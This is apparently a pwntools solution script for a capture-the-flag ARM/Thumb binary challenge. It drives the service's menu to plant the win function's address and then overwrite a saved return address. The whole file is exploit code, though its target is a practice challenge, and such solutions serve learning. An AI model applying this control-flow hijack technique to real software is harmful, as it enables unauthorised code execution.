from pwn import *

# p = process("./run.sh")
win = 0x10828
p=remote(  'chal.nbctf.com',30178)
context.log_level='debug'
pause()
p.sendlineafter(b">",b"1")           # use mine feature to set coal variable
p.sendlineafter(b">",b"67625")          # address of win+1 for thumb
p.sendlineafter(b">",b"0")           # send depth as 0 so we dont enter the for loop 
p.sendlineafter(b">",b"2")          
p.sendlineafter(b">",b"12")          # use the extract feature to overwrite ret addr     
p.sendlineafter(b">",b"4")           
p.interactive()                       # return 
